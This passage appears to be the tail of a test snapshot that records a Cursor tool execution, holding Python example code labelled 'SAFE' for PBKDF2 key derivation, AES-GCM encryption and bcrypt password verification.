algorithm=hashes.SHA256(),\\n        length=32,\\n        salt=salt,\\n        iterations=100000,  # High iteration count slows brute-force\\n        backend=default_backend()\\n    )\\n    key = base64.b64encode(kdf.derive(password.encode())).decode()\\n    return key, salt\\n\\n\\n# SAFE: Using AES-GCM for encryption\\ndef encrypt_safe_gcm(data: bytes, key: bytes = None) -> tuple[bytes, bytes, bytes]:\\n    # SAFE: AES-GCM provides authenticated encryption\\n    if key is None:\\n        key = secrets.token_bytes(32)  # 256-bit key\\n    \\n    iv = secrets.token_bytes(12)  # 96-bit IV for GCM\\n    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())\\n    encryptor = cipher.encryptor()\\n    ciphertext = encryptor.update(data) + encryptor.finalize()\\n    \\n    return ciphertext, encryptor.tag, iv\\n\\n\\n# SAFE: Verifying password hash\\ndef verify_password_bcrypt(password: str, hashed: str) -> bool:\\n    # SAFE: bcrypt verification handles salt automatically\\n    import bcrypt\\n    return bcrypt.checkpw(password.encode(), hashed.encode())\\n\\n\\n# SAFE: Key derivation from password\\ndef derive_key_from_password(password: str, salt: bytes = None) -> tuple[bytes, bytes]:\\n    # SAFE: Use proper key derivation function\\n    if salt is None:\\n        salt = secrets.token_bytes(16)\\n    \\n    kdf = PBKDF2HMAC(\\n        algorithm=hashes.SHA256(),\\n        length=32,\\n        salt=salt,\\n        iterations=100000,\\n        backend=default_backend()\\n    )\\n    key = kdf.derive(password.encode())\\n    return key, salt\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
    ],
    "responseTime": "2025-10-29T17:23:35.541Z",
    "tool": "Cursor",
  },
]
`;
